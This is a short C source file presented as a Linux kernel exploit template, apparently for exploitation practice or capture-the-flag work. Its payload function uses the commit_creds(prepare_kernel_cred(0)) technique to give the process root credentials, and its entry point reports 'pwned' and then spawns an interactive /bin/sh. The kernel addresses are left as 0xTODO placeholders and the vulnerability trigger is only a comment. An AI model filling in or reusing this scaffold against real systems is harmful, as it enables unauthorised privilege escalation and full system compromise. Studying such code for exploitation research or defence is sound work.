/*
 * Kernel exploit template.
 *
 * Copyright (c) 2015 Samuel Groß
 */

#include "libc.h"

#define COMMIT_CREDS 0xTODO
#define PREPARE_KERNEL_CRED 0xTODO

int payload()
{
    void *(*prepare_kernel_cred)(int) = (void*)PREPARE_KERNEL_CRED;
    void (*commit_creds)(void*) = (void*)COMMIT_CREDS;

    commit_creds(prepare_kernel_cred(0));

    return -1;
}

void _start()
{

    //
    // pwn kernel here
    //

    // check if we succeeded
    if (getuid() == 0)
        puts("pwned :)");
    else
        puts("exploit failed :(\nhave a shell anyways...");

    char* argv[] = {"/bin/sh", "-i", 0};
    char* envp[] = {0};
    execve("/bin/sh", argv, envp);

    puts("execve() failed ?!");
    exit();
}
